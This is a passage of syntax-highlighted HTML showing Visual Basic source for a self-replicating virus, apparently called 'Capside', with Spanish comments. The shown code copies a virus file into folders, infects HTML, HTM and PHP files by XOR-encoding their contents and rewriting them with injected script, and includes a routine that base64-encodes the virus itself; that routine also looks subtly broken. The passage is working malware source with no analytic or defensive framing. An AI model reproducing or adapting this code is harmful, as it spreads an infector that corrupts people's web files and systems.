</span><span class="sc7">FileCopy</span><span class="sc0"> </span><span class="sc7">Sp</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\CapsideCode.htm"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">FVs.Path</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Rf</span><span class="sc6">(</span><span class="sc7">Ry</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc1">'Sub para infectar archivos html, htm, php, etc
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">CodeH</span><span class="sc6">(</span><span class="sc7">rp</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">

</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">H1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Cf.OpenTextFile</span><span class="sc6">(</span><span class="sc7">rp</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Hr1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">H1.Readline</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">InStr</span><span class="sc6">(</span><span class="sc7">Hr1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"MIME"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">H1.Close</span><span class="sc0">
</span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
</span><span class="sc3">Else</span><span class="sc0">
</span><span class="sc7">Hr2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">H1.ReadAll</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">H1.Close</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">Hr2</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Ck</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Asc</span><span class="sc6">(</span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">Hr2</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">))</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Ck</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Asc</span><span class="sc6">(</span><span class="sc4">"%"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">Ec</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Ec</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"¥"</span><span class="sc0">
</span><span class="sc3">ElseIf</span><span class="sc0"> </span><span class="sc7">Ck</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">Ec</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Ec</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">28</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">ElseIf</span><span class="sc0"> </span><span class="sc7">Ck</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">Ec</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Ec</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">29</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Else</span><span class="sc0">
</span><span class="sc7">Ec</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Ec</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc7">Ck</span><span class="sc0"> </span><span class="sc3">Xor</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0">

</span><span class="sc7">Ec</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Capside = Ec("</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Ec</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">")"</span><span class="sc0">

</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">H2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Cf.OpenTextFile</span><span class="sc6">(</span><span class="sc7">rp</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">H2.write</span><span class="sc0"> </span><span class="sc7">CodeScript1</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Ec</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">CodeScript2</span><span class="sc0">
</span><span class="sc7">H2.Close</span><span class="sc0">


</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc1">'Function para obtener el code en base64 del virus
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">B64</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">vsFullPathname</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">b</span><span class="sc0">           </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">Base64Tab</span><span class="sc0">  </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Variant</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">3</span><span class="sc6">)</span><span class="sc0">      </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Byte</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">sResult</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">FileIn</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">n</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
        
</span><span class="sc7">Base64Tab</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Array</span><span class="sc6">(</span><span class="sc4">"A"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"B"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"C"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"D"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"E"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"F"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"G"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"H"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"I"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"J"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"K"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"L"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"M"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"N"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"O"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"P"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Q"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"R"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"S"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"T"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"U"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"V"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"W"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"X"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Y"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Z"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"a"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"b"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"c"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"d"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"e"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"f"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"g"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"h"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"i"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"j"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"k"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"l"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"m"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"n"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"o"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"p"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"q"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"r"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"s"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"t"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"u"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"v"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"w"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"x"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"y"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"z"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"0"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"1"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"2"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"3"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"4"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"5"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"6"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"7"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"8"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"9"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"+"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"/"</span><span class="sc6">)</span><span class="sc0">
    
</span><span class="sc3">Erase</span><span class="sc0"> </span><span class="sc7">bin</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">FileIn</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">b</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">FileIn</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">FreeFile</span><span class="sc0">
    
</span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc7">vsFullPathname</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Binary</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">FileIn</span><span class="sc0">
</span><span class="sc7">sResult</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">LOF</span><span class="sc6">(</span><span class="sc7">FileIn</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">LOF</span><span class="sc6">(</span><span class="sc7">FileIn</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Mod</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc3">Step</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">

</span><span class="sc3">Get</span><span class="sc0"> </span><span class="sc7">FileIn</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc3">Get</span><span class="sc0"> </span><span class="sc7">FileIn</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc3">Get</span><span class="sc0"> </span><span class="sc7">FileIn</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">2</span><span class="sc6">)</span><span class="sc0">
        
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc2">64</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">sResult</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">sResult</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc7">b</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc7">n</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">\</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;H3F</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Base64Tab</span><span class="sc6">(</span><span class="sc7">b</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">b</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">((</span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc7">n</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;H3</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Or</span><span class="sc0"> </span><span class="sc6">((</span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">\</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;HF</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Base64Tab</span><span class="sc6">(</span><span class="sc7">b</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">b</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">((</span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc7">n</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;HF</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Or</span><span class="sc0"> </span><span class="sc6">((</span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">2</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">\</span><span class="sc0"> </span><span class="sc2">64</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;H3</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Base64Tab</span><span class="sc6">(</span><span class="sc7">b</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">b</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc7">n</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;H3F</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Base64Tab</span><span class="sc6">(</span><span class="sc7">b</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc3">Not</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">LOF</span><span class="sc6">(</span><span class="sc7">FileIn</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Mod</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">LOF</span><span class="sc6">(</span><span class="sc7">FileIn</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Mod</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Get</span><span class="sc0"> </span><span class="sc7">FileIn</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">LOF</span><span class="sc6">(</span><span class="sc7">FileIn</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Mod</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">b</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">\</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;H3F</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Base64Tab</span><span class="sc6">(</span><span class="sc7">b</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">b</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">((</span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;H3</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Or</span><span class="sc0"> </span><span class="sc6">((</span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">\</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;HF</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Base64Tab</span><span class="sc6">(</span><span class="sc7">b</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">b</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">((</span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;HF</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Or</span><span class="sc0"> </span><span class="sc6">((</span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">2</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">\</span><span class="sc0"> </span><span class="sc2">64</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;H3</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Base64Tab</span><span class="sc6">(</span><span class="sc7">b</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"="</span><span class="sc0">
</span><span class="sc3">Else</span><span class="sc0">
</span><span class="sc7">b</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">\</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;H3F</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Base64Tab</span><span class="sc6">(</span><span class="sc7">b</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">b</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">((</span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;H3</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Or</span><span class="sc0"> </span><span class="sc6">((</span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">\</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;HF</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Base64Tab</span><span class="sc6">(</span><span class="sc7">b</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"=="</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
